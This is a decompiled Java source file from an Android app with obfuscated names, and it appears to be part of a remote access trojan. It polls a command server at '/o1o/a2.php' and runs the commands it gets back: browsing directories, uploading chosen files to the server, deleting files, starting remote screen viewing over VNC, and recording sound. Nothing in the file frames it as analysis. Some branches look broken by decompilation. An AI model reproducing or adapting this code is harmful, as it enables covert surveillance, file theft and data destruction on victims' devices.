package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import java.io.File;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0050b;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.cwwzcpcu;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.nvsdtnxkzjgw;

/* JADX INFO: loaded from: classes.dex */
public class xelytgswelv extends IntentService {

    /* JADX INFO: renamed from: a */
    String f599a;

    /* JADX INFO: renamed from: b */
    C0020b f600b;

    /* JADX INFO: renamed from: c */
    C0022c f601c;

    /* JADX INFO: renamed from: d */
    C0050b f602d;

    /* JADX INFO: renamed from: e */
    C0019a f603e;

    public xelytgswelv() {
        super("xelytgswelv");
        this.f599a = "";
        this.f600b = new C0020b();
        this.f601c = new C0022c();
        this.f602d = new C0050b();
        this.f603e = new C0019a();
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        C0020b c0020b;
        String str;
        String str2;
        C0020b c0020b2;
        String str3;
        Intent intent2;
        String str4;
        String str5;
        this.f599a = this.f600b.m264q(this).replace(" ", "");
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(1000L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            String strM251e = this.f600b.m251e(this, "websocket");
            if (strM251e.equals("")) {
                return;
            }
            C0050b c0050b = this.f602d;
            StringBuilder sb = new StringBuilder();
            sb.append(strM251e);
            this.f601c.getClass();
            sb.append("/o1o/a2.php");
            String string = sb.toString();
            StringBuilder sb2 = new StringBuilder();
            sb2.append("tuk_tuk=");
            sb2.append(this.f600b.m242c(this.f599a + "|:| "));
            String strM247d = this.f600b.m247d(c0050b.m297b(string, sb2.toString()));
            this.f600b.m230a("RATresponce", "" + strM247d);
            if (strM247d != "**") {
                this.f600b.m230a("RAT_command", "" + strM247d);
                if (strM247d.contains("opendir:")) {
                    String absolutePath = strM247d.replace("opendir:", "").split("!!!!")[0];
                    if (absolutePath.contains("getExternalStorageDirectory")) {
                        absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();
                    }
                    String strM236b = this.f600b.m236b(new File(absolutePath));
                    C0050b c0050b2 = this.f602d;
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(strM251e);
                    this.f601c.getClass();
                    sb3.append("/o1o/a2.php");
                    String string2 = sb3.toString();
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append("tuk_tuk=");
                    sb4.append(this.f600b.m242c(this.f599a + "|:|getPath!!!!" + absolutePath + "!@@!" + strM236b));
                    c0050b2.m297b(string2, sb4.toString());
                    this.f600b.m230a("path", "getPath!!!!" + absolutePath);
                    c0020b = this.f600b;
                    str = "sss";
                    str2 = "getFileFolder" + strM236b;
                } else if (strM247d.contains("downloadfile:")) {
                    String str6 = strM247d.replace("downloadfile:", "").split("!!!!")[0];
                    this.f600b.m230a("file", str6);
                    try {
                        this.f600b.m228a(this, str6, "", "getfiles[]");
                        C0050b c0050b3 = this.f602d;
                        StringBuilder sb5 = new StringBuilder();
                        sb5.append(strM251e);
                        this.f601c.getClass();
                        sb5.append("/o1o/a2.php");
                        String string3 = sb5.toString();
                        StringBuilder sb6 = new StringBuilder();
                        sb6.append("tuk_tuk=");
                        sb6.append(this.f600b.m242c(this.f599a + "|:|!!!refreshfilefolder!!!"));
                        c0050b3.m297b(string3, sb6.toString());
                    } catch (Exception unused) {
                        c0020b = this.f600b;
                        str = "sss";
                        str2 = "error sender";
                        c0020b.m230a(str, str2);
                    }
                } else if (strM247d.contains("deletefilefolder:")) {
                    try {
                        File file = new File(strM247d.replace("deletefilefolder:", "").split("!!!!")[0]);
                        file.delete();
                        String strM236b2 = this.f600b.m236b(new File(file.getParent()));
                        C0050b c0050b4 = this.f602d;
                        StringBuilder sb7 = new StringBuilder();
                        sb7.append(strM251e);
                        this.f601c.getClass();
                        sb7.append("/o1o/a2.php");
                        String string4 = sb7.toString();
                        StringBuilder sb8 = new StringBuilder();
                        sb8.append("tuk_tuk=");
                        sb8.append(this.f600b.m242c(this.f599a + "|:|getPath!!!!" + file.getParent() + "!@@!" + strM236b2));
                        c0050b4.m297b(string4, sb8.toString());
                    } catch (Exception unused2) {
                    }
                } else if (!strM247d.contains("startscreenVNC")) {
                    if (strM247d.contains("stopscreenVNC")) {
                        c0020b2 = this.f600b;
                        str3 = "vnc";
                    } else if (strM247d.contains("startsound")) {
                        if (this.f600b.m246c(this, this.f603e.f342g[0])) {
                            this.f600b.m250d(this, "sound", "start");
                            intent2 = new Intent(this, (Class<?>) brtltydqhiuqbb.class);
                            str4 = "str";
                            str5 = "no";
                            startService(intent2.putExtra(str4, str5));
                        }
                    } else if (strM247d.contains("startforegroundsound")) {
                        if (this.f600b.m246c(this, this.f603e.f342g[0])) {
                            this.f600b.m250d(this, "sound", "start foreground");
                            intent2 = new Intent(this, (Class<?>) brtltydqhiuqbb.class);
                            str4 = "str";
                            str5 = "foreground";
                            startService(intent2.putExtra(str4, str5));
                        }
                    } else if (strM247d.contains("stopsound")) {
                        c0020b2 = this.f600b;
                        str3 = "sound";
                    } else if (strM247d.contains("**noconnection**")) {
                        this.f600b.m250d(this, "websocket", "");
                        this.f600b.m250d(this, "vnc", "stop");
                        this.f600b.m250d(this, "sound", "stop");
                        stopService(intent);
                    }
                    c0020b2.m250d(this, str3, "stop");
                } else if (!this.f600b.m232a(this, nvsdtnxkzjgw.class)) {
                    this.f600b.m250d(this, "vnc", "start");
                    Intent intent3 = new Intent(this, (Class<?>) cwwzcpcu.class);
                    intent3.addFlags(268435456);
                    startActivity(intent3);
                }
                c0020b.m230a(str, str2);
            }
        }
    }
}
